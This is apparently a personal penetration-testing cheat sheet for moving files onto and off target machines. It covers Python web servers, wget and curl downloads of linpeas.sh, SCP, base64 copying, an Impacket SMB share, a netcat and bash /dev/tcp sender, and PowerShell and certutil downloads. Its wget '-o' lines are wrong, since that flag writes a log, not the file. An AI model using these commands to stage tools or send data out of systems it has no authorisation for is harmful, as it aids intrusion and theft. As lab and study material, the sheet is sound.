# File Transfer Cheatsheet

## Host a Web Server
### Python 3
```
python3 -m http.server [PORT]
```
### Python 2
```
python -m SimpleHTTPServer 8000
```

---

## wget
### Download file
```
wget http://[IP]:[PORT]/[FILE]
```
### Save to path
```
wget http://[IP]:[PORT]/[FILE] -o /tmp/[FILE]
```
eg:
```
wget http://10.10.20.5:8888/linpeas.sh -o /tmp/linpeas.sh
```

---

## curl
### Download file
```
curl http://[IP]:[PORT]/[FILE] -o /tmp/[FILE]
```
eg:
```
curl http://10.10.20.5:8888/linpeas.sh -o /tmp/linpeas.sh
```

---

## SCP
### Local to Remote
```
scp [FILE] user@[IP]:/remote/path/
```
### Remote to Local
```
scp user@[IP]:/remote/[FILE] /local/path/
```
### Recursive folder
```
scp -r /local/dir user@[IP]:/remote/path/
```

---

## Base64
> Make sure to compare the hash value for both source and destination files to make sure its not corrupted
### Encode the File - Linux
```
base64 [FILE] | xclip -selection clipboard
```
### Encode the File - Mac
```
base64 -i [FILE] | pbcopy
```
### Decode
```
echo -n "[B64STRING]" | base64 -d > [FILE]
```
### Windows - Encode (PowerShell)
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[FILE]"))
```
### Windows - Decode (PowerShell)
```
[IO.File]::WriteAllBytes("[FILE]", [Convert]::FromBase64String("[B64]"))
```

---

## SMB (Windows)
### Host share (Impacket)
```
impacket-smbserver share $(pwd) -smb2support
```
### Copy from share
```
copy \\[IP]\share\[FILE] C:\Windows\Temp\
```

---

## Netcat
### Receiver
```
nc -lvnp [PORT] > [FILE]
```
### Sender
> there's multiple ways, but this is my fav one (ippsec the goat). And this only work w bash
```
cat [FILE] > /dev/tcp/[IP]/[PORT]
```

---

## PowerShell (Windows)
### Download file
```
Invoke-WebRequest -Uri http://[IP]:[PORT]/[FILE] -OutFile C:\Windows\Temp\[FILE]
```
### Shorthand
```
iwr http://[IP]:[PORT]/[FILE] -o C:\Temp\[FILE]
```
### Certutil (LOLBin)
```
certutil -urlcache -split -f http://[IP]:[PORT]/[FILE] [FILE]
```

--- 
to be update....
